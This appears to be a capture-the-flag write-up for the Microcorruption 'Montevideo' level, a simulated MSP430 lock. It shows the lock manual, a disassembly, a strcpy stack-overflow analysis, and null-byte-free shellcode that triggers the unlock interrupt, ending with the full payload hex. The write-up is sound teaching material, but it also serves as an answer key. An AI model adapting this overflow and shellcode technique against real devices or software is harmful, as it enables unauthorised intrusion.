# 08: Montevideo

- _Points:_ 50 points
- _Version number_: c.03

## Password

```
34507f1134f0ff220412b0124c454141ee43
```

## Manual

```
Lockitall                                            LOCKIT PRO r c.03
______________________________________________________________________

              User Manual: Lockitall LockIT Pro, rev c.03
______________________________________________________________________


OVERVIEW

    - Lockitall developers  have rewritten the code  to conform to the
      internal secure development process.
    - This lock is attached the the LockIT Pro HSM-2.


DETAILS

    The LockIT Pro c.03  is the first of a new series  of locks. It is
    controlled by a  MSP430 microcontroller, and is  the most advanced
    MCU-controlled lock available on the  market. The MSP430 is a very
    low-power device which allows the LockIT  Pro to run in almost any
    environment.

    The  LockIT  Pro   contains  a  Bluetooth  chip   allowing  it  to
    communiciate with the  LockIT Pro App, allowing the  LockIT Pro to
    be inaccessable from the exterior of the building.

    There  is no  default  password  on the  LockIT  Pro HSM-2.   Upon
    receiving the  LockIT Pro,  a new  password must  be set  by first
    connecting the LockitPRO HSM to  output port two, connecting it to
    the LockIT Pro App, and entering a new password when prompted, and
    then restarting the LockIT Pro using the red button on the back.

    LockIT Pro Hardware  Security Module 2 stores  the login password,
    ensuring users  can not access  the password through  other means.
    The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the
    HSM will  directly send the  correct unlock message to  the LockIT
    Pro Deadbolt  if the password  is correct, otherwise no  action is
    taken.

    This is Hardware  Version C.  It contains  the Bluetooth connector
    built in, and two available  ports: the LockIT Pro Deadbolt should
    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
    connected to port 2.

    This is Software Revision 03. We have received unconfirmed reports
    of issues with the previous series of locks. We have reimplemented
    much  of the  code according  to our  internal Secure  Development
    Process.




(c) 2013 LOCKITALL                                            Page 1/1
```

## Writeup

This level is an extension of Level 07 (Whitehorse). The key difference here is that instead of loading the contents from `getsn` directly onto a buffer on the stack, ample space is allocated at `0x2400` on the heap, before calling `strcpy` to copy the contents from the heap back onto the stack.

```
4508:  3e40 3000      mov   #0x30, r14
450c:  3f40 0024      mov   #0x2400, r15
4510:  b012 a045      call  #0x45a0 <getsn>
4514:  3e40 0024      mov   #0x2400, r14
4518:  0f41           mov   sp, r15
451a:  b012 dc45      call  #0x45dc <strcpy>
451e:  3d40 6400      mov   #0x64, r13
4522:  0e43           clr   r14
4524:  3f40 0024      mov   #0x2400, r15
4528:  b012 f045      call  #0x45f0 <memset>
452c:  0f41           mov   sp, r15
452e:  b012 4644      call  #0x4446 <conditional_unlock_door>
```

While `strcpy` is vulnerable since it is unbounded, we cannot use our previous payload in Level 07 if we tried, as our stack would then look like this:

```
43e0:   6045 0000 0000 0000 0000 0000 3245 3012   `E..........2E0.
43f0:   7f00 0000 0000 0000 0000 0000 0000 3c44   .............<D
```

What happened here? We inserted a payload `30127f00b01232454141414141414141ae36` of 18 bytes, but it seems that only 6 bytes went through. What happened is that `strcpy` copies byte for byte from `src` to `dst` until it reaches a `0x00` byte, which is used to indicate a string terminator.

Instead, we need to avoid a `0x00` byte in our payload. We can do this by using a different set of instructions to achieve the same result. One such example:

```
add #0x117f, r4
and #0x22ff, r4
push r4
call #0x454c
```

What we did here is to use `AND` to remove any unwanted bytes so that they would evaluate to `0x00`. This assembles into `34507f1134f0ff220412b0124c45`, which does not have a `0x00` byte in it.

As such, our final payload is:

```
34507f1134f0ff220412b0124c454141ee43
```
